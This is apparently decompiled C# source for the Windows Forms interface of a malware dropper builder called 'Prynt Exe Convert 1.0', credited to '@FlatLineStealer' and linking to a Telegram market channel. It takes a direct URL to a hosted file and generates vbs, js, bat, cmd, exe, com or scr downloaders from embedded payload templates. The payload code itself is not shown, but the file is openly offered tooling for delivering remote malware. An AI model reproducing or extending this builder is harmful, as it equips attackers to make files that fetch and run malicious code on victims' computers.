using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using TheDropper.Generators;
using TheDropper.Properties;

namespace TheDropper;

public class Builder : Form
{
	private IContainer components;

	private TextBox textBoxUrl1;

	private ComboBox comboBoxExtension1;

	private Button buttonBuild;

	private Label labelAuthor;

	private Label labelFileUrl;

	private Label labelFileExtension;

	private TextBox textBoxUrl;

	private ComboBox comboBoxExtension;

	private Label label1;

	private Label label2;

	public Builder()
	{
		InitializeComponent();
	}

	private void buttonBuild_Click(object sender, EventArgs e)
	{
		string text = textBoxUrl.Text;
		string text2 = comboBoxExtension.Text;
		if (!text.StartsWith("http"))
		{
			MessageBox.Show(this, "Please enter valid url", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			textBoxUrl1.Focus();
			return;
		}
		if (string.IsNullOrEmpty(text2))
		{
			MessageBox.Show(this, "Please select extension", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			comboBoxExtension1.Focus();
			return;
		}
		ScriptGenerator scriptGenerator = new ScriptGenerator(text);
		ExecutableGenerator executableGenerator = new ExecutableGenerator(text);
		string text3;
		switch (text2)
		{
		case "vbs":
			text3 = scriptGenerator.Generate(Resources.vbs_payload, "vbs");
			break;
		case "js":
			text3 = scriptGenerator.Generate(Resources.js_payload, "js");
			break;
		case "bat":
			text3 = scriptGenerator.Generate(Resources.batch_payload, "bat");
			break;
		case "cmd":
			text3 = scriptGenerator.Generate(Resources.batch_payload, "cmd");
			break;
		case "exe":
			text3 = executableGenerator.Generate("exe");
			break;
		case "com":
			text3 = executableGenerator.Generate("com");
			break;
		case "scr":
			text3 = executableGenerator.Generate("scr");
			break;
		default:
			MessageBox.Show(this, "Unknown extension", "Error", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			return;
		}
		if (File.Exists(text3))
		{
			MessageBox.Show(this, "Saved: " + text3, "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
	}

	private void labelAuthor_Click(object sender, EventArgs e)
	{
		Process.Start("https://t.me/pryntdotmarket");
	}

	private void Builder_Load(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.textBoxUrl1 = new System.Windows.Forms.TextBox();
		this.comboBoxExtension1 = new System.Windows.Forms.ComboBox();
		this.buttonBuild = new System.Windows.Forms.Button();
		this.labelAuthor = new System.Windows.Forms.Label();
		this.labelFileUrl = new System.Windows.Forms.Label();
		this.labelFileExtension = new System.Windows.Forms.Label();
		this.textBoxUrl = new System.Windows.Forms.TextBox();
		this.comboBoxExtension = new System.Windows.Forms.ComboBox();
		this.label1 = new System.Windows.Forms.Label();
		this.label2 = new System.Windows.Forms.Label();
		base.SuspendLayout();
		this.textBoxUrl1.Anchor = System.Windows.Forms.AnchorStyles.None;
		this.textBoxUrl1.BackColor = System.Drawing.Color.FromArgb(32, 31, 29);
		this.textBoxUrl1.Font = new System.Drawing.Font("Trebuchet MS", 20.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.textBoxUrl1.ForeColor = System.Drawing.Color.FromArgb(245, 150, 244);
		this.textBoxUrl1.Location = new System.Drawing.Point(439, 76);
		this.textBoxUrl1.Name = "textBoxUrl1";
		this.textBoxUrl1.Size = new System.Drawing.Size(192, 39);
		this.textBoxUrl1.TabIndex = 0;
		this.comboBoxExtension1.Anchor = System.Windows.Forms.AnchorStyles.None;
		this.comboBoxExtension1.BackColor = System.Drawing.Color.FromArgb(32, 31, 29);
		this.comboBoxExtension1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.comboBoxExtension1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.comboBoxExtension1.Font = new System.Drawing.Font("Trebuchet MS", 20.25f);
		this.comboBoxExtension1.ForeColor = System.Drawing.Color.FromArgb(245, 150, 244);
		this.comboBoxExtension1.FormattingEnabled = true;
		this.comboBoxExtension1.Items.AddRange(new object[7] { "exe", "scr", "com", "bat", "cmd", "vbs", "js" });
		this.comboBoxExtension1.Location = new System.Drawing.Point(440, 121);
		this.comboBoxExtension1.Name = "comboBoxExtension1";
		this.comboBoxExtension1.Size = new System.Drawing.Size(191, 43);
		this.comboBoxExtension1.TabIndex = 2;
		this.buttonBuild.Anchor = System.Windows.Forms.AnchorStyles.None;
		this.buttonBuild.BackColor = System.Drawing.Color.FromArgb(32, 31, 29);
		this.buttonBuild.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.buttonBuild.Font = new System.Drawing.Font("Trebuchet MS", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.buttonBuild.ForeColor = System.Drawing.Color.Red;
		this.buttonBuild.Location = new System.Drawing.Point(269, 192);
		this.buttonBuild.Name = "buttonBuild";
		this.buttonBuild.Size = new System.Drawing.Size(82, 29);
		this.buttonBuild.TabIndex = 3;
		this.buttonBuild.Text = "Build";
		this.buttonBuild.UseVisualStyleBackColor = false;
		this.buttonBuild.Click += new System.EventHandler(buttonBuild_Click);
		this.labelAuthor.Anchor = System.Windows.Forms.AnchorStyles.None;
		this.labelAuthor.Cursor = System.Windows.Forms.Cursors.Hand;
		this.labelAuthor.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.labelAuthor.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.labelAuthor.ForeColor = System.Drawing.Color.Red;
		this.labelAuthor.Location = new System.Drawing.Point(11, 185);
		this.labelAuthor.Name = "labelAuthor";
		this.labelAuthor.Size = new System.Drawing.Size(242, 36);
		this.labelAuthor.TabIndex = 4;
		this.labelAuthor.Text = "Coded By @FlatLineStealer";
		this.labelAuthor.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.labelAuthor.Click += new System.EventHandler(labelAuthor_Click);
		this.labelFileUrl.AutoSize = true;
		this.labelFileUrl.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.labelFileUrl.ForeColor = System.Drawing.Color.Red;
		this.labelFileUrl.Location = new System.Drawing.Point(12, 54);
		this.labelFileUrl.Name = "labelFileUrl";
		this.labelFileUrl.Size = new System.Drawing.Size(83, 16);
		this.labelFileUrl.TabIndex = 5;
		this.labelFileUrl.Text = "File direct url";
		this.labelFileExtension.AutoSize = true;
		this.labelFileExtension.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.labelFileExtension.ForeColor = System.Drawing.Color.Red;
		this.labelFileExtension.Location = new System.Drawing.Point(12, 92);
		this.labelFileExtension.Name = "labelFileExtension";
		this.labelFileExtension.Size = new System.Drawing.Size(141, 18);
		this.labelFileExtension.TabIndex = 6;
		this.labelFileExtension.Text = "Output file extension";
		this.textBoxUrl.Location = new System.Drawing.Point(165, 50);
		this.textBoxUrl.Name = "textBoxUrl";
		this.textBoxUrl.Size = new System.Drawing.Size(186, 20);
		this.textBoxUrl.TabIndex = 7;
		this.comboBoxExtension.FormattingEnabled = true;
		this.comboBoxExtension.Items.AddRange(new object[7] { "exe", "scr", "com", "bat", "cmd", "vbs", "js" });
		this.comboBoxExtension.Location = new System.Drawing.Point(165, 92);
		this.comboBoxExtension.Name = "comboBoxExtension";
		this.comboBoxExtension.Size = new System.Drawing.Size(186, 21);
		this.comboBoxExtension.TabIndex = 8;
		this.label1.AutoSize = true;
		this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 18f, System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic, System.Drawing.GraphicsUnit.Point, 0);
		this.label1.ForeColor = System.Drawing.Color.Red;
		this.label1.Location = new System.Drawing.Point(12, 9);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(262, 29);
		this.label1.TabIndex = 9;
		this.label1.Text = "Prynt Exe Convert 1.0";
		this.label2.AutoSize = true;
		this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.label2.ForeColor = System.Drawing.Color.White;
		this.label2.Location = new System.Drawing.Point(12, 127);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(335, 54);
		this.label2.TabIndex = 10;
		this.label2.Text = "Upload Your File To A FTP/CPANEL And Put The \r\nDirect Link Into The Textbox And Choose\r\nFile And Click Build. ";
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Inherit;
		this.BackColor = System.Drawing.Color.FromArgb(64, 64, 64);
		base.ClientSize = new System.Drawing.Size(360, 233);
		base.Controls.Add(this.label2);
		base.Controls.Add(this.label1);
		base.Controls.Add(this.comboBoxExtension);
		base.Controls.Add(this.textBoxUrl);
		base.Controls.Add(this.labelFileExtension);
		base.Controls.Add(this.labelFileUrl);
		base.Controls.Add(this.labelAuthor);
		base.Controls.Add(this.buttonBuild);
		base.Controls.Add(this.comboBoxExtension1);
		base.Controls.Add(this.textBoxUrl1);
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "Builder";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "Prynt Exe Convert";
		base.Load += new System.EventHandler(Builder_Load);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
